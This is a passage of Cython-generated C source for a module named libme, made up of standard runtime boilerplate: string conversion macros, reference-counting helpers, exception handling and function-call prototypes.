    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "libme.pyx",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyObjectSetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* IncludeStringH.proto */
#include <string.h>

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* StrEquals.proto */
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyString_Equals __Pyx_PyUnicode_Equals
#else
#define __Pyx_PyString_Equals __Pyx_PyBytes_Equals
#endif

/* ListAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* append.proto */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* None.proto */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* RaiseTooManyValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);

/* RaiseNeedMoreValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);

/* IterFinish.proto */
static CYTHON_INLINE int __Pyx_IterFinish(void);

/* UnpackItemEndCheck.proto */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* StringJoin.proto */
#if PY_MAJOR_VERSION < 3
#define __Pyx_PyString_Join __Pyx_PyBytes_Join
#define __Pyx_PyBaseString_Join(s, v) (PyUnicode_CheckExact(s) ? PyUnicode_Join(s, v) : __Pyx_PyBytes_Join(s, v))
#else
#define __Pyx_PyString_Join PyUnicode_Join
